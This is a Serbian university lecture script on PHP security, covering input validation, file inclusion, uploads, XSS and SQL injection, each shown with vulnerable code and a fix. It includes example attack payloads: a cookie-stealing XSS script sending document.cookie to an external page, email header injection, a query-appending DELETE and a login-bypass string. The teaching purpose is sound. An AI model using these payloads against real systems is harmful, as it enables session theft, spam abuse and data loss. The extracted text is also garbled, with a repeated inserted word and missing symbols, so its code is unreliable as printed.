 SKRIPTA IZPROMENA PREDMETA INTERNET TEHNOLOGIJE                  Sigurnost i bezbednost PHP aplikacija SADRŽAJ   Uvod  Osnove sigurnosti  Validacija inputa  ValidacijaPROMENA brojnih vrednosti  Validacija teksualnih inputa  Ostali nesigurni inputi  Priključenje skriptiPROMENA  Upload fajlova  Nesigurna platforma  Registracija globalnihPROMENA promenjivihPROMENA  MagičniPROMENA navodnici za GET POST i COOKIE magic quotes gpc  Cross Site Scripting XSS  HTML entiteti  IzbacivanjePROMENA HTML tagova  SQL Injection  Zaštita  mysql realPROMENA escapePROMENA stringPROMENA  Pripremljeni izrazi Prepared statements  Sesije  Fiksacija sesija Session Fixation  Otmica sesija Session HijackingPROMENA  Autentifikacija i autorizacija korisnikaPROMENA PROMENA PasswordPROMENA hashing  BrutePROMENA force  Zabrana pristupa preko IPPROMENA adresePROMENA  Dugotrajno održavanje sesija  Upravljanje greškama PROMENA Opšte preporuke za sigurnost web aplikacija  Uvod PHP programski jezik je jedan od najpopularnijih web programskih jezika današnjice Kranje je fleksibilan relativnoPROMENA je jednostavan i prijateljski je naklonjen programerima početnicima Uz samo malo znanja svako može kreirati svoj kontakt formular knjigu gostiju mejling listu ili čak veoma ozbiljnuPROMENA dinamičnu web aplikacijuPROMENA Međutim mnogi programeri ne obraćaju pažnju na najvažniji aspektPROMENA web programiranja sigurnost  Prva asocijacija na sigurnost je svakako uspešna zaštita od hakerskih napada Ciljevi ovakvih napadaPROMENA moguPROMENA biti raznovrsni kao i tipovi aplikacija kojePROMENA pravimoPROMENA ali se generalno kao cilj svakog hakerskogPROMENA napada može smatrati sa jedne strane stvaranje materijalne ili nematerijalnePROMENA štete celokupnom sistemu a sa drugePROMENA stvaranje materijalne ili nematrijalne dobiti samog napadača Konkretno ukoliko napadačPROMENA ukradePROMENA našu bazu korisnika sigurno nam je naneoPROMENA neku štetu a sa drugePROMENA strane tu bazu korisnika možePROMENA daPROMENA iskoristi za dobijanje materijalne koristi  Međutim sigurnost web aplikacijePROMENA nije samo zaštita od hakerskih napadaPROMENA već i zaštita aplikacije od namernih i nenamerniih korisničkih akcijaPROMENA koje mogu izazvati nepredviđene greške Lukavi i zlonamerni hakeri svakako mogu bilo kakvu grešku u aplikaciji da iskoriste za potencijalni napad pa samim timPROMENA i na prvi pogled bezazlene greške mogu predstavljati sigurnosne propuste i ako neke greške ne moraju predstavljati opasnost po samu aplikaciju ili podatke samo po sebi ukoliko nešto ne radiPROMENA očekivano nije dobro  Cilj ove skripte je da se studenti upoznaju sa osnovama bezbednosti jedne web aplikacije da predvide moguće sigurnosne rizike i daPROMENA ih uspešno ukone Sadržaj se bazira na sigurnostiPROMENA najčeće korišćenih metoda u web programiranju kao što su procesiranje formulara sigurnostPROMENA baze podataka sigurnost sesija i autorizacije korisnika Takođe daje i primere tipa best practice kojih biPROMENA se trebaloPROMENA pridžavati Svi primeri u ovoj skripti suPROMENA edukativnog karaktera i nikako ne treba da budu iskorišćeni u zlonamerne svrhe Osnove sigurnosti Svaka web aplikacijePROMENA je napisana u cilju da izvršiPROMENA zahteve korisnika Ti zahtevi moguPROMENA biti prikaži mi stranicu ili pošalji napisani mail ili ulogujPROMENA me odnosno sve komande i podaciPROMENA koje korisnik šalje aplikaciji Interpretiranje tih komandi iPROMENA podataka je osnovna delatnost aplikacije a baš u toj interpretaciji leže najveći sigurnosni rizici  Komande i podaciPROMENA koji se šalju aplikaciji se nazivaju inputi i mogu biti poslatiPROMENA putem URL adrese HTML formulara Kolačića cookie Header parametara U web sigurnosti važi opšte pravilo da korisniku nikadaPROMENA ne treba verovati paPROMENA tako ukoliko se od njega zahteva da unese svoju email adresu ne mora bašPROMENA značiti da će on to uraditi Može uneti neku komanduPROMENA koja će obrisati celu bazu podatakaPROMENA ili iskoristiti server za slanje masovnih SPAM poruka Validacija inputa Kao štoPROMENA već rečeno najveći sugurnosni propusti leže u interpretaciji inputa pa stoga validacija tih komandi i podataka predstavlja najveći sigurnosni zadatak u kreiranju web aplikacije Ujedno validacija inputa omogućavaPROMENA da se radi saPROMENA realnim i ispravnim podacima odnosno daPROMENA ose odbace sve nepotrebne podatkePROMENA Uzmimo za primer samo kreiranje mejling liste da li je bolje imati korisnika saPROMENA ispravnim podacima ili sa neispravnim Ili zamislitePROMENA da se na kompanijskom blogu nađe SPAM komentaraPROMENA koji sadrže linkove do pornografskog sadržaja iliPROMENA maliciozne JavaScript kodove koje mogu naneti štetu korisnicima  Dakle validacijaPROMENA inputa ne samo da odigrava značaju ulogu kaoPROMENA sigurnosni faktor već omogućava uspešno poslovanje kreiranje dobrog imidža i možda pre svega čuva dragoceno vreme i novac koje bi se izgubio ispravljajući nastalePROMENA štete PROMENA Sa tehičkePROMENA strane treba imati u vidu da su svi inputi stringovi tekstualne vrednost tako da i ako su one prikazane kao brojne vrednosti oni su i dalje samo stringovi PHP ima tu mogućnost da radi sa različitim tipovima podataka i da ih menja dinamično u hodu Pa tako akoPROMENA deklarišemo stringovnu promenjivu koja sadrži vrednost nju možemo sabrati sa bilo kojim brojem  php  broj razlikuje se od broj  novi broj broj  OvajPROMENA k d nikako nePROMENA predstavlja sigurnosni rizikPROMENA već samo jednu karakteristiku PHP a dobri programeri uvek moraju imatiPROMENA na umu sa kakvim tipovima podataka rade To je jedna od osnova pravilne validacije inputa pa krenimo redom  Validacija brojnih vrednosti  Validacija brojnih vrednosti je veoma jednostavna i omogućava nam i da radimo sa ispravnim podacima i da veoma jednostavno povećamo sigurnost naše PHP aplikacije KonkretnoPROMENA ukoliko imamo stranicuPROMENA koja na osnovuPROMENA URL komande odnosno zadatog ID parametra ispisujePROMENA informacije o proizvodu i ukoliko nismo proverili da se zaista radi o ID parametru koji je brojčana vrednost u najvećim slučajevima jeste napadačPROMENA lako može izazvati greške u radu aplikacije pa čak iPROMENA SQL injection odnosno izmenu samogPROMENA upita za dohvatanjePROMENA informacija o proizvodu i tako ugroziti sigurnost aplikacije  Primer takvog k da može izgledati ovako  php  www example com proizvod php id DELETE FROM proizvodiPROMENA  id GET id   sqlPROMENA SELECT FROM proizvodi WHERE id id PROMENA Jasno je da bi se umesto jednog izvršila dvaPROMENA upitaPROMENA i sql promenjiva bi izgledala ovako SELECT FROM proizvodi WHERE id DELETE FROM proizvodi  ValidacijaPROMENA ovakvog inputa odnosno ID parametra bi bila jednostavna Trebalo bi samoPROMENA daPROMENA se osigura da je uneti parametar zaista broj a da u ostalim slučajevima prikažemo greškuPROMENA odnosno nepostojeću stranu Za tu svrhu se može iskoristiti is numeric funkciju if is numeric GET idPROMENA  prikaži stranicu  MeđutimPROMENA bolji način je kastovanje podataka odnosno menjanjePROMENA tipa Na ovaj načinPROMENA definitivno se osigurava rad sa pravim tipom podatka  id int GET id if id  prikaži stranu  SledećiPROMENA k d je ujedno i primer za best practice u ovakvim slučajevima   www example com proizvod php id DELETE FROM proizvodi   Prvo proveramo da liPROMENA jePROMENA uopštePROMENA zadat obezan parametar if empty GET id  prikaži   kastovanje  id int GET id   optimizacija sprečavamo nepotreban upit if id  prikaži   sada je upit siguranPROMENA  sql SELECT FROMPROMENA proizvodi WHERE id id   Napomena mysql query ne dozvoljava izvršenje više upita odjednom aliPROMENA drzajveri za PostgreSQL i SQLite ih podržavaju Savet Operacije sa bazomPROMENA podataka su najskuplje u smislu vremena i memorije pa tako ukoliko nije neophodo imati neki upit ne treba ga ni imati Ovaj primer odlično opisuje da ne treba izvršiti upit ukoliko je id manji ili jednak nuli jer u našoj bazi verovatno i nećemo imati proizvod sa tim ID Validacija teksualnih inputaPROMENA Dok je filtriranje brojeva relativno jednostavno filtriranje tekstualnih inputa je za nijansu komplikovanije Za neke prostije formate inputa kao što su poštanski brojPROMENA telefon email adresa iPROMENA slični možemo koristiti već postojeće PHPPROMENA funkcije Ali pre detaljnog objašnjena sledeći primer odlično prikazuje važnost filtriranje inputaPROMENA Ukoliko bismo imali jednostavnu kontakt formu koju korisnik popunjava svojim ličnim podacima email adresom i komentarom jednostavnaPROMENA skripta koja biPROMENA izvršavala tu kontakt formu i slala podatke na našu emailPROMENA adresu biPROMENA mogla da izgleda ovako   phpPROMENA  podaci sa forme  ime POST ime  email POST email  tekst POST tekst   Heder za ispis pošaljioca u mail klijentu  heder From ime email n r   slanje email a na našu adresuPROMENA mail kontakt example com tekst heder  Ova skriptaPROMENA će svakako raditiPROMENA očekivano ali samo ukoliko verujemo korisniku da će zaista uneti ispravne podatkePROMENA PoštoPROMENA mu ne smemo verovati napadač veoma lako može iskoristiti ovakvu skriptu za slanje SPAM poruka sa našeg servera Dovoljno jePROMENA da umesto svog imena ili email adrese unese nešto ovako  example example comPROMENA n r To example example com n r Bcc example example com  Jasno je da će se vrednostPROMENA iz email direktno kopirati u header i da će poruka biti poslataPROMENA na onoliko adresa koliko napadač želi Važnost zaštite u ovom slučajuPROMENA je veomaPROMENA velikaPROMENA Svakako nije poželjno da se sa našeg servera šalju SPAMPROMENA poruke zbog kojih možemo biti označeni kao maliciozni i završiti na nekoj crnoj listi Još jednom rešenje ovog i mnogih drugih problema leži u filtriranju inputaPROMENA  Ctype funkcijePROMENA  Character type funkcije imajuPROMENA odlične mogućnosti aPROMENA pritom imaju i odlične performansePROMENA Ove funkcije proveravaju svakiPROMENA karakter i rezultat će bitiPROMENA TRUEPROMENA jedino ako svaki karakter zadovoljava postavljeni kriterijum UPROMENA suprotom ukoliko je karakter nedozvoljenogPROMENA tipa rezultat ćePROMENA biti FALSE Funkcija Opis ctype alnum Provera slovnih i brojnih karaktera ctype alpha Provera slovnih karaktera ctype digitPROMENA Provera brojnih karakteraPROMENA ctype lower Provera malih slova ctype upper Provera velikih slovaPROMENA Tabela najčešćePROMENA korišćenih ctype funkcija Primeri korišćenjaPROMENA Ctype funkcija ctype alphaPROMENA Pera true ctype alpha Pera falsePROMENA ctype alnum Pera truePROMENA  Filter funkcije  Filter funkcije imaju dve mogućnostiPROMENA da provere string validate po postavljenim kriterijumima iliPROMENA da ga isprave sanitization ukoliko ne odgovara kriterijumima Svakako je preporučljivo koristi samo validaciju ali i ispravljanje imaPROMENA svoju široku primenu filter var var filter  Prvi atribut je vrednost koja se proverava a drugi predstavlja kriterijume za proveru a sledećaPROMENA tabela predstavlja najčešće korišćenePROMENA kriterijume Filter Opis FILTER VALIDATE EMAIL Provera email adrese FILTER VALIDATE INTPROMENA Provera brojnih vrednosti sa opcijama min range i max range FILTER VALIDATEPROMENA IP Provera IP adrese FILTER VALIDATE URL Provera ispravne URL adrese  Sledeći primer prikazuje pravilnu validaciju email adrese Takođe predstavlja i rešenje za pređašnji primer koji je omogućavao slanje masovnig SPAM poruka  phpPROMENA PROMENA email POST email  if filter var email FILTER VALIDATEPROMENA EMAIL  sadaPROMENA jePROMENA sigurno poslati mail  Regularni izrazi regular expressionPROMENA regex  Regularni izrazi su skup pravilaPROMENA koji se izvršavaju nadPROMENA određenim podacima u cilju identifikacije karaktera i ili znakovnih skupovaPROMENA u nekom tekstualnom objektu Regularne izraze koriste svi programski jezici imaju relativno dobre performanse i široku primenjivost Sledeća tabela prikazuje često korišćene PHP funkcije koje koriste regularne izraze Funkcija OpisPROMENA preg match Izvršava regex proveru nadPROMENA podacima preg match all PretražujePROMENA podatke na osnovu regexPROMENA i postavlja rezultate u niz na osnovu zadatihPROMENA pravila preg replace Pretražuje podatke na osnovu regex i pogotkePROMENA zamenjujePROMENA sa drugim podacima  Pošto regularni izrazi i njihovo funkcionisanje nijePROMENA temaPROMENA ovogPROMENA kursaPROMENA biće prikazani samo najšeće korišćeni izrazi u proveri podataka   php  izraz za proveru email adrese  regex a zA Z a zA Z a zA Z  if preg match regexPROMENA email  ispavna email adresa  U sledećoj tabeli su dati često korišćeni i par zanimljivih regularnih izraza Izraz Opis  a z Sva mala slova u intervaluPROMENA od slova a do z PROMENA a zA Z Slovni i brojni znakoviPROMENA mala i velika slova i brojevi  aPROMENA fA F Format md hashPROMENA vrednosti Format Master kreditne kartice Format Visa kreditne kartice  Ostali nesigurni inputi U ovoj skripti se dosta pažnje posvećuje pravilnojPROMENA validaciji inputa jer je to svakako osnova sigurnosti svake PHP aplikacije U ovom poglavlju će biti objašnjeni konkretni propusti koji nemaju direktne veze saPROMENA podacima ali mogu da predstavljajuPROMENA veoma ozbiljne sigurnosne rizike PriključenjePROMENA skripti Veoma često se dešava da u zavisnosti od URL parametara priključujemo različite skripte ili ispisujemo različite teksualne datoteke NaPROMENA primer ukoliko naša aplikacija radi tako što priključuje određenePROMENA module može se pojavit sigurnosni rizikPROMENA ukoliko korisniku nismo ograničili da priključi samoPROMENA dozvoljene module Primer jednog takvog k da   phpPROMENA  www example comPROMENA index php modulePROMENA contactPROMENA  if isset GET module  include modules GET modulePROMENA php  Napadač bi u ovom slučaju mogao da priključiPROMENA bilo koju skriptu pa čak iPROMENA skripte koje se ne nalaze u modulesPROMENA direktorijumu ukoliko bi module parametar izmenio u nešto poput ovoga  wwwPROMENA example com index php module config Primer ovog koda na prvi pogledPROMENA ne predstavlja sigurnosni propust jer će sePROMENA skripta config phpPROMENA izvršiti iPROMENA osetljiviPROMENA podaci neće bitiPROMENA prikazani ali svakako ovo jestePROMENA nepravilno korišćenje aplikacije Veći rizik bi bio kada bi se ovakva skripta koristila za ispis tekstualnih fajlova na primer HTML template fajlova pa svakako trebaPROMENA obratiti pažnju na filtriranje ovakvog tipa inputa Rešenje bi bilo da se omogući priključenje samoPROMENA onih skripti koje smoPROMENA mi odredili Sledeći primer k da radi baš toPROMENA  php  Niz sa dozvoljenim modulima  modules array contact about questbook if issetPROMENA GET module in array GET module modules  include modules GET module php Upload fajlovaPROMENA Programeri često pravePROMENA grešku zato što ne proveravaju ekstenziju fajla kada omogućavaju korisnicima da pošalju svoje slike i druga dokumenta koja se čuvaju na serveru Ukoliko bi na ovakvom sistemu napadačPROMENA poslao i izvršio PHPPROMENA skriptu kojom može da se kreće po fajl sistemu bez problema bi mogao videti k d biloPROMENA koje skripte pa čak dobitiPROMENA podatke za pristup bazi ZaštitaPROMENA jePROMENA veoma slična gornjemPROMENA primeru dozvolite samo sigurne extenzije ili ukoliko želite daPROMENA dozvolite upload php skripti osigurajte da sePROMENA one ne mogu izvršiti tako što će te promeniti ime fajla  Takođe ovo je jedan odPROMENA velikih problema na deljenom hostingu zapravo ukoliko je isključena direktiva safe mode a uglavnom jeste bilo ko može pogledatiPROMENA sadržaj svih fajlova kojiPROMENA se nalazePROMENA serveru Sledeći primer predstavlja best praticePROMENA za upload datotekaPROMENA i osigurava da će bitiPROMENA uploadovani samo omogućeni formati   php  Da li je neštoPROMENA poslato ifPROMENA issetPROMENA FILES file  exit DatotekaPROMENA nije poslata  PROMENA datotekaPROMENA koja je poslataPROMENA preko formulara  temp FILES file tmp name  name FILES file namePROMENA   niz sa dozvoljenim tipovima datoteka PROMENA allowed array jpeg jpg png doc pdf PROMENA ekstenzija datoteke  extPROMENA strrchr name  if in array ext allowedPROMENA is uploaded file temp  sve je OK  move uploaded file tempPROMENA dokumenti name  else  exit Nedozvoljen tip datoteke ili greška pri slanjuPROMENA   PrimetićujePROMENA se da je korišćena funkcija strrchr za dobijanje ekstenzije zajedno sa tačkom međutim mogu sePROMENA koristitiPROMENA i druge metode kao na primer end explode name DaPROMENA li je datoteka zaista uploadovana se radi pomoću funkcije is uploaded file i predstavlja obavezanu sigurnosnu proveru Nesigurna platforma Na mnogim internet stranama mogu se videti kritike upućene ka samoj platformi odnosno da je PHP platforma veoma nesigurna prepuna sigurnosnih propusta i daPROMENA svojom lakoćom čini da programeri sami prave greške Ali PHP može biti siguranPROMENA kao bilo koji drugi jezik ukoliko se poštuju osnovna pravila sigurnosti Ako se uzmu zaPROMENA primer neki od najpopularnijih sajtova današnjicePROMENA kao na primer Facebook koji su napisani u PHP u i veoma su sigurni PROMENA Sigurnosni propusti u platformi su ne tako česta pojava ali su veoma česta meta napada PHP je otvorenog kodaPROMENA open source kaoPROMENA i Apache server čiji je on modul kao i Linux operativni sistem na kome se uPROMENA najvećemPROMENA broju slučajeva i nalazePROMENA naše web aplikacijePROMENA Svetla stranaPROMENA otvorenog koda je štoPROMENA je sam k d aplikacija dostupan široj zajednici i samim tim se greške u softveru lako otkrivaju i rešavajuPROMENA Tamna strana je da je taj k dPROMENA dozvoljen i zlonamernim programerima koji greške u softveru moguPROMENA iskoristiti za eventualni napad I ako su svi poznatiPROMENA sigurnosniPROMENA propusti na platformiPROMENA rešeniPROMENA u najnovijim verzijamaPROMENA softveraPROMENA problem i dalje postoji ukolikoPROMENA se našaPROMENA aplikacija nalazi na serveru koji koristiPROMENA stariju verziju operativnog sistema i softvera koji i dalje sadrži  Svakako ukoliko imamo kontrolu nad serverom moralo bi se uvek da voditi računa da nam je softver up to date Kontrola nad softverom često nije moguća jer će se naše web aplikacije nalaziti kod unajmljenog hosting provajdera koji zbog kompatibilnosti sa starijim verzijama aplikacija ili nekih drugih razloga i dalje koriste starePROMENA verzije sofvera Mnogi na tržištu i dalje na svojim serverima koristePROMENA PHP koji sadrži relativno dosta sigurnosnih propusta koji su rešeni u kasnijim verzijama  Dakle privatni hostingPROMENA i redovno održavan softver je odlična opcija u suprotimPROMENA situacijama potrebno je obratiti pažnju na usluge hosting provajdera odabrati samo proverenePROMENA i obavezno uvek voditiPROMENA računa o redovnom bekapu KaoPROMENA što je rečeno PHP jePROMENA open source projekat i kako su sami njegovi programeri izjaviliPROMENA on je pisan pod mnogim okolnostima ponekad u pijanom stanju i da kao takav sadži dosta ne sigurnih funkcionalnosti Registracija globalnih promenjivih SvakakoPROMENA jedan od najnesigurnijih propusta je register globals direktiva koja je u današnjim verzijama PHP a podrazumevano isključena ali se programeri iPROMENA dalje veoma često susreću sa ovim problemom Mnogi hosting provajderi i dalje ovu direktivu drže uključenom zbog komatibilnostiPROMENA saPROMENA starijim aplikacijama i ponekad jednostavno nemamo drugog rešenja osim da steknemo parPROMENA dobrih navika koje će same po sebi rešiti ovaj problem registerPROMENA globalsPROMENA je direktiva kojaPROMENA omogućuje registrovanje globalnih promenjivih odnosno promenjive poslate POST GET iPROMENA cookie metodama mogu se direktnoPROMENA koristiti u k du Sledeći primer to opisuje   php  urlPROMENA www example com index php ime Pera  echo ime Pera  I ako naizgled veomaPROMENA korisna opcija zapravo ona predstavlja jedan od najvećih sigurnosnihPROMENA rizika ukoliko se ne koristi pravilno na siguran način Primer koji opisuje sigurnosni propust  php  PozivamoPROMENA funkciju koja proverava autorizaciju administratora if proveriAdministratora  admin true  Ukoliko je admin prikazujemo muPROMENA opcije  u suprotnom login stranu if admin  include admin php  else  include login php  Jasno je da će ovaj k dPROMENA priključiti admin php skriptu ukoliko se URL adresi priključi promenjivaPROMENA admin Ili primer sa skriptom za brisanje korisnika  php  korisnici koji se brišu  korisnici PROMENA korisnici   Brisanje korisnika foreach korisnici as id  mysql queryPROMENA DELETE FROM korisnici WHERE KorisnikId id  TakođePROMENA može se veoma lako ubaciti dodatni korisnici korisnici korisnici  RešenjaPROMENA ovog problema ObaveznoPROMENA i preporučljivo je uvek prethodno inicijalizovati promenjive i dodeliti im default vrednost  php  Primer zaPROMENA autorizacijuPROMENA  adminPROMENA false if proveriAdministratoraPROMENA   Primer za brisanje korisnika  korisnici array  korisnici Isključiti registerPROMENA globals i koristitePROMENA superPROMENA globalne promenjive GET POST i COOKIE Ovo naravno važi samo u slučaju da imate privilegije ili kontrolu nad serverom PostojiPROMENA više načina da sePROMENA isključi u php ini setovati dodati izmeniti na register globals false uPROMENA htaccessPROMENA fajlu dodati php value register globals on Koristiti konstante na primer  php define ADMIN proveriAdministratora  if ADMIN  Imajte u vidu da je ova direktiva totalno izbačena iz verzije PHP kaoPROMENA i mnogePROMENA druge nesigurne funkcije Nikako sePROMENA ne treba oslanjati na ovu mogućnost i ne razvijati aplikaciju koja će raditi samo pod ovom direktivomPROMENA Magični navodnici za GET POST i COOKIE magic quotesPROMENA gpc Pokušaj PHP programera da globalnoPROMENA zaustave SQL incjection e i reše brojne probleme oko filtriranja inputa izrodio je direktivu magic quotes gpc koja jePROMENA na većini hosting servera uključena po defaultu Radi se o tome da PHP automatskiPROMENA radi escape nad globalnimPROMENA promenjivima GET POST i COOKIE odnosno dodaje ispred jednostrukih dvostrukih navodnika i još nekihPROMENA specijalnihPROMENA karaktera  UPROMENA radu sa MySQL bazom uvek je potrebno raditi escape karaktera Ukoliko je ova direktiva uključena i nije proverena pre upisa vrednosti u bazu bićemoPROMENA u situaciji da imamo dvostruko escapovane podatke što dovodiPROMENA do problema sa podacima   php  Kada je magic quotes gpc uključen  Traženi url www example com index php date test echo GET data test   Dvostruko escapovanje karaktera pri upisu u DB echo mysql realPROMENA escape string GETPROMENA data test   Preporučeno je da sePROMENA magic quotes gpc isključi ukoliko je to moguće ili da se podaci normalizuju uklanjanjem tih dodatnih slash eva Uklanjanje se vrši funkcijomPROMENA stripslashes PROMENA  php PROMENA Normalizacija podataka if getPROMENA magic quotes gpc  POST kljuc stripslashes POST kljuc  Važna napomena je da je magic quotes gpc izbačen iz PHP verzije kao i većina drugih funkcionalnosti koji mogu predstavljati sigurnosni propust Cross Site Scripting XSS XSS jePROMENA tip sigurnosnih propusta kojiPROMENA je karakterističan za webPROMENA aplikacije kojiPROMENA omogućava napadaču da ubaci k d koji se izvršava naPROMENA klijentskoj strani JavaScript ActiveX HTML u našu web stranicu Cilj ovakvogPROMENA napada je dobijanjePROMENA osetljivih podataka kao što su korisničkePROMENA sesije cookie odvođenje na drugu stranicu ili bilo koji drugi cilj koji se može postići izvršenjem koda naPROMENA korisničkoj strani  XSS uPROMENA su najčešće podložne web aplikacije koje ispisuju korisnički sadržajPROMENA naPROMENA primer forumi knjige gostiju komentari članovaPROMENA iPROMENA druge  Sledeći primer opisuje XSS napad na stranicuPROMENA koja ispisuje komentare članova Ukoliko bi imali formu za upis komentaraPROMENA sličnu ovojPROMENA   form action komentar php method POST PROMENA Vaše ime input type text name ime br  Komentar textarea name komentar rows cols textarea br  input type submit value Upišite komentar  form  i PHP skriptu koja ispisuje komentar  php echo p ime jePROMENA napisao brPROMENA echo komentar p  definitivno biPROMENA postojao ozbiljan sigurnosni propust KorisnikPROMENA može upisati komentar ali i dodati HTMLPROMENA i JavaScript koji neće biti vidljiv od strane drugih korisnika Komentar sa kojim napadačPROMENA može ukrasti podatke o sesiji koji se čuvaju u cookiu je sledeći   script  documentPROMENA location http www examplePROMENA com ukradi php kolacic  document cookie  script  Ako bi bilo koji korisnik posetio ovuPROMENA stranu koja sadrži komentar sa ovim k dom biće preusmeren na drugu adresu Ne samo da će svi naši korisnici otići na nekiPROMENA drugi sajtPROMENA većPROMENA će napadač moći da pristupi našim kolačićima preko GET metode UPROMENA zavisnostiPROMENA od naših potreba postoji više rešenja i više različitih PHP funkcija kojePROMENA nam mogu pomoći HTML entiteti Jedno od rešenjaPROMENA za XSS je da se specijani HTML karakteri konvertuju u njihove tekstualne entitete lt gt apos quot amp iPROMENA tako možemo biti sigurniPROMENA da će HTML k d biti ispisan onakoPROMENA kako je unet pa tako i JavaScript nećePROMENA biti izvšen  PHP poseduje dvePROMENA funkcije kojePROMENA konvertujuPROMENA HTML tagove u entitete Jedna od njih je htmlspecialchars koja konvertuje gore navedenePROMENA HTML tagove u odgovarajućePROMENA entitetePROMENA  php komentar htmlspecialchars a href test Test a ENT QUOTES echo komentar lt a href test gtPROMENA Test lt a gt  Odnosno zaštita za našuPROMENA skriptuPROMENA za ispis komentara bi bila  php  konvertovanje outputaPROMENA  ime htmlspecialchars ime  komentarPROMENA htmlspecialchars komentar  echo p ime je napisao br echo komentar p PROMENA Druga funkcija je htmlentities koja konvertuje sve specijalne karaktere u svoje entitetePROMENA kao što suPROMENA i druge Izbacivanje HTML tagova Drugi način sprečavanja XSS a je izbacivanje HTMLPROMENA tagova iz komentara Za ovoPROMENA je potrebna vrlo jednostavna funkcija strip tags koja jednostavno briše sve HTML i PHP tagove i ostavlja čist tekst   php komentar p Tekst u paragrafu p Komentar a href Link a echo strip tagsPROMENA komentar  U ovomPROMENA slučaju svi html tagovi će biti izbačeni i biće ispisan samo sledeći tekst Tekst u paragrafu Link  strip tags ima još jednu mogućnost a to je da izostavi tagove koje ne želimo da izbacimo Na primer ukoliko želimoPROMENA da omogućimo korisnicima da koriste jednostvno formatiranje teksta kao na primerPROMENA bold em i sl možemo koristiti strip tags komentar strongPROMENA em u  Međutim moramo uzeti u obzir da se JavaScript može izvršiti unutar bilo kojeg taga korišćenjem atributa onLoad ili onClick i sličnih pa stoga ovakvo filtriranje može predstavljatiPROMENA sigurnosni rizik SQL InjectionPROMENA Dok XSS predstavlja indirektan napad na korisnike SQL Injection predstavlja direktan napad naPROMENA PHP aplikaciju odnosno na bazu podatakaPROMENA Cilj ovog napada je da se izmeniPROMENA određeni SQL upitPROMENA kako bi se izvršile razne akcije od dobijanja aletrantivnih podataka do izmene ili brisanja podataka iz baze podataka  Napad SQL Injection om se uglavnomPROMENA vrši na skripte za proveru autentifikacije korisnika odnosnoPROMENA prilikom provere korisničkog imena i lozinke kako bi se SQL upit izmenioPROMENA i uvek izvršio tako daPROMENA uvek dohvata podatke o nekom korisniku Sledeći primer demonstrira propust prilikom provere korisničkih podataka   php  podaci sa login forme  username POST username  password POST password   provera podataka  sql SELECT FROM korisnici WHERE username username AND password passwordPROMENA  result mysql query sql if mysql num rows result  korisnik je ulogovan  Ukoliko bi napadač u ovakav login formular umesto korisničkog imena i lozinke uneo sledeću vrednost a OR SQL upit koji bi se izvršio izgledao bi ovako SELECT FROM korisniciPROMENA WHERE username a OR AND password a OR  Ovakav upit bi sigurno vratio podatke o nekom korisniku i u ovom konkretnomPROMENA primeru omogućio bi korisniku daPROMENA bude ulogovan Dodavanjem još nekih uslova na primer WHERE id ili nekogPROMENA drugog ID a postoji velika verovatnoća da će biti autorizovan kao administrator sistema  Osim kod provere autentifikacije može se iskoristiti i u druge zlonamernePROMENA svrhe a jedan od njih je ubacivanje dodatnog upita koji može uništiti podatke ili nekePROMENA druge zlonamerne akcijePROMENA Sledeći primer demonstrira SQL injection u cilju izvršenja dodatnog upita  ubacivanje dodatnog upita  name Pera DELETE FROM korisnici mysql query SELECTPROMENA FROM korisnici WHERE name name  Izvšenje više upita odjednom nije podržano u mysql query funkciji ali drugi drajveriPROMENA npr za PostgreSQL ili SQLite to dozvoljavaju paPROMENA tako izvšenje ovakvog koda predstavljaPROMENA ozbiljan sigurnosni propustPROMENA Zaštita Kao što je već spominjano uPROMENA ranijim glavama filtriranje inputa može sprečiti većinu sigurnosnih problema i obavezna jePROMENA stavka sigurne aplikacijePROMENA UkolikoPROMENA bismoPROMENA filtrirali podatke tako da korisniku zabranimo unos specijalnih karaktera specifičnih za SQL upite na primer apostrofe i za lozinke možemo daPROMENA koristimo jednosmerne enkripcije na primer md sigurno bismo povećali sigurnost Međutim postojePROMENA iPROMENA druge metode za sprečavanje napada a da dozvolimo sve karaktere Escape inputa mysql real escape string Pripremljeni izrazi mysqlPROMENA real escape string Ova funkcija pripada mysql drajveru ali je poseduje i mysqli drajver mysqli real escape string i osigurava da će svi specijalniPROMENA karakteri biti pravilnoPROMENA eskejpovani odnosnoPROMENA da se pri građenju upita i dalje ponašaju kao sastavni deo tog stringa i nikako ne iskoristePROMENA uPROMENA izmeni upita Ova funkcija je best practice i mora se izvršiti nad svim promenjivima koji grade upit   username mysql real escape stringPROMENA POST username PROMENA Upit za gorePROMENA navedeni primer nakon eskejpovanja a promenjivihPROMENA izgleda ovakoPROMENA  SELECT FROM korisnici WHERE username a OR ANDPROMENA password a OR  i zaštićen je od SQL injection napada Pošto ove funkcije za eskejpovanje pripadaju drajveru zaPROMENA rad sa bazom podataka sve kose crte neće biti unete sa ostalimPROMENA podacima u bazu što nije slučaj u korišćenju addslashes funkcije Napomena Pretpostavka je da je isključen magic quotes gpc u suprotom se podaci moraju normalizovati pa tek ondaPROMENA eskejpovati Normalizacija podataka je objašnjenaPROMENA ranije  Pripremljeni izrazi Prepared statements Pripremljeni izrazi nisu tolika velika novost ali mnogi programeri početnici izbegavaju da ih koriste a verovatno je toPROMENA zbog slabog razumevanjaPROMENA načina na kojiPROMENA rade PrePROMENA svega treba napomenuti da pripremljeni izrazi ne mogu da se koriste u starim verzijama drajvera kao što je standaradni mysql Takoreći mysqlPROMENA drajver je starijeg datuma i njegov daljiPROMENA razvoj je odavno obustavljen Čak je i preporuka PHP konzorcijuma daPROMENA se on potpunoPROMENA izbaci iz korišćenja i da se koriste drajveri kao što su MySQLi i PDO Ova dva drajvera su dosta brži i poseduju dosta sigurnosnih karakteristika Priprema izraza odnosno njegovo građenje se odvijaPROMENA na MySQL serveru pa stoga ne postoji mogućnost same izmene upita uPROMENA php aplikaciji a zbog načina na koji radi ni na serveruPROMENA Prilikom pisanja upitaPROMENA umesto promenjivih vrednosti koriste se operater a promenjive se šalju posebnom funkcijom onim redosledom kakvim se ubacuju u upitPROMENA Sledeći k d opisuje rad MySQLi drajvera i pripremljenih izraza   php  username POSTPROMENA username  password POST password   Konekcija sa MySQL bazom  mysqli new mysqli localhost user password world   stmt mysqli prepare SELECT FROM korisnici WHERE username ANDPROMENA password LIMIT  Vrednosti promenjivih se šalju na u upit  stmt bind param ss username password   izvršavanje upita  stmt execute  if stmt affected rowsPROMENA  korisnik je ulogovan  PROMENA  zatvaranje izraza iPROMENA upita  stmt close  Više oPROMENA MySQLi drajveru i njegovim funkcionalnostima možete saznati naPROMENA adresi http php net manual en book mysqli phpPROMENA Sesije HTTP protokol je statičan i glavna ulogaPROMENA mu je da na osnovuPROMENA zahteva prikaže HTML stranu Kada je prikažePROMENA odnosno kada server pošaljePROMENA odgovor klijentuPROMENA u vidu 